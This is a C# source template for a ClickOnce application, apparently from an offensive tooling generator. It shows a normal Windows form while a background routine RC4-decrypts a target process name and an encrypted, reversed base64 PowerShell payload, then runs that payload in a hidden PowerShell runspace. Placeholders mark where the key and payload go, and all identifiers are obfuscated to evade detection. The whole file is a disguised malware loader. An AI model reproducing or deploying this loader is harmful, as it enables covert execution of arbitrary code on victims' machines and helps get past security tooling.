using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.Diagnostics;

namespace ClickOnceTemplate
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Thread VAR50 = new Thread(() => VAR8());
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static void VAR8()
        {
			  byte[] VAR9 = {[KEY]};
			  byte[] VAR100 = Convert.FromBase64String(VAR60.VAR61("[PROCESS_NAME]"));
			  byte[] VAR101 = VAR16.VAR28(VAR9, VAR100);
			
            if (Process.GetProcessesByName(Encoding.ASCII.GetString(VAR101)).Length > 0)
            {
              Runspace VAR4 = RunspaceFactory.CreateRunspace();
              VAR4.Open();
              byte[] VAR10 = Convert.FromBase64String(VAR60.VAR61("[PAYLOAD]"));
              Array.Reverse(VAR10, 0, VAR10.Length);
              VAR10 = Convert.FromBase64String(Encoding.ASCII.GetString(VAR10));

              byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
              
              RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
              Pipeline VAR12 = VAR4.CreatePipeline();            
              VAR12.Commands.AddScript(Encoding.UTF8.GetString(VAR11));
	      VAR12.Commands.Add("Out-String");
              Collection<PSObject> VAR13 = VAR12.Invoke();
              VAR4.Close();
            }
        }
    }
	
	public class VAR60 {
		public static string VAR61(string VAR62) {
			string VAR63 = "[PATTERN_1]";
			string VAR64 = "[PATTERN_2]";
			return VAR62.Replace(VAR63, "N").Replace(VAR64, "B");
		}
	}

	public class VAR16 {
		public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
			int VAR20, VAR21, VAR22, VAR23, VAR24;
			int[] VAR25, VAR26;
			byte[] VAR27;
			VAR25 = new int[256];
			VAR26 = new int[256];
			VAR27 = new byte[VAR19.Length];
			for (VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
				VAR26[VAR21] = VAR21;
			}
			for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
				VAR24 = VAR26[VAR21];
				VAR26[VAR21] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
			}
			for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
				VAR20++;
				VAR20 %= 256;
				VAR22 += VAR26[VAR20];
				VAR22 %= 256;
				VAR24 = VAR26[VAR20];
				VAR26[VAR20] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
				VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
				VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
			}
			return VAR27;
		}
		public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
			return VAR17(VAR29, VAR30);
		}
	}
}
